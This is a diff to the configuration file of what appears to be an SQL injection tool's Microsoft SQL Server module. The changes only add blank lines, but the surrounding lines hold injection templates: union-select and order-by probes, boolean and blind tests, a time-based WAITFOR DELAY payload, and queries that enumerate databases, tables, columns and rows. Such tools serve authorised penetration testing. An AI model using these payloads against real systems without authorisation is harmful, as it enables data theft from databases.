@@ -8,6 +8,7 @@ resource:
       %2B'${ENCLOSE_VALUE_SQL}'
       %2Buser
       %2B'${TRAIL_SQL}'
+      
  schema: 
   database: |
    SELECT 
@@ -46,6 +47,7 @@ resource:
            ',',
            '${SEPARATOR_CELL_SQL}'
        )
+       
   table: |
    SELECT 
        replace(
@@ -84,6 +86,7 @@ resource:
            ',',
            '${SEPARATOR_CELL_SQL}'
        )
+       
   column: |
    SELECT 
        replace(
@@ -125,6 +128,7 @@ resource:
            ',',
            '${SEPARATOR_CELL_SQL}'
        )
+       
   row: 
    query: |
     SELECT 
@@ -175,6 +179,7 @@ resource:
          )
      )
     concat: "%2b '%7f' %2b"
+    
 strategy: 
  configuration: 
   slidingWindow: |
@@ -196,10 +201,12 @@ strategy:
    errorMessage: 
     - "[Microsoft][SQL Server"
     - "SQL Server"
+    
  normal: 
   indices: "union select ${INDICES}"
   capacity: "(select concat('${LEAD}${INDICE}', ${CALIBRATOR}))"
   orderBy: "order by 1337"
+  
  boolean: 
   test: 
    falses: 
@@ -229,7 +236,9 @@ strategy:
         %26 ${BIT}
     )
    length: "len(${INJECTION}) > ${INDEX}"
+   
   blind: "and ${TEST}"
+  
   time: |
    ; if (${TEST}) 
        WAITFOR DELAY '00:00:00' 
